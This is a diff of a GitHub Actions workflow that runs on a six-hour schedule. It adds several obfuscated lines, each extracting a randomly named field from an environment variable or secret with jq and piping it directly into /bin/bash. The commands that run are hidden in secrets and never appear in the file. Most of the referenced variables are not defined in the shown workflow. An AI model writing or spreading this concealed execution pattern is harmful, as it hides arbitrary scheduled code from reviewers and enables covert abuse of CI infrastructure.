@@ -2,17 +2,22 @@ name: xiangyuhuanliu
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
-jobs:  # 30011
+    - cron: '45 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xiangyuhuanliu
         env:
-          t2884: ${{ secrets.t2884 }}
+          dbeek129: ${{ secrets.dbeek129 }}
         run: |
-          echo $t2884 | jq -r .kn3 | /bin/bash
-          echo $tzou355 | jq -r .ullt9 | /bin/bash
-          echo $ltkwk31231 | jq -r .ok97 | /bin/bash
+          echo $dbeek129 | jq -r .c15 | /bin/bash
+          echo $xklsv1 | jq -r .ntjs84778 | /bin/bash
+          echo $avdgn275 | jq -r .yrt00 | /bin/bash
+          echo $nzqpw8 | jq -r .uccjs2 | /bin/bash
+          echo $l176 | jq -r .boqf6 | /bin/bash
+          echo $l267 | jq -r .r1 | /bin/bash
+          echo $t483 | jq -r .pmw39495 | /bin/bash
 
